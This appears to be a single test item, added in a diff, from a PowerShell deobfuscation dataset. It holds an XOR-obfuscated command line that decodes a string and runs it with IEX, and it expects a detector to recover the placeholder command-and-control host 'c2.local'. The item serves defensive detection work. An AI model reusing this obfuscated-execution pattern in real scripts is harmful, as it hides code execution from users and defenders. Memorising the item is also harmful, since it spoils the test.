@@ -1,0 +1,10 @@
+{
+  "id": "ps-xor-ascii-2-mut2",
+  "category": "ps-xor-inline",
+  "command_line": "$k=[System.Text.Encoding]::ASCII.GetBytes('SECRET');        $b=[byte[]](59,49,55,34,127,123,124,38,113,124,41,59,48,36,47,125);        $d=-join(0..($b.Length-1)|%{[char]($b[$_] -bxor $k[$_ % $k.Length])});        IEX $d",
+  "expected_keywords": [
+    "c2.local"
+  ],
+  "source": "nivxray-rc40-obfuscation",
+  "license": "CC-BY-4.0"
+}
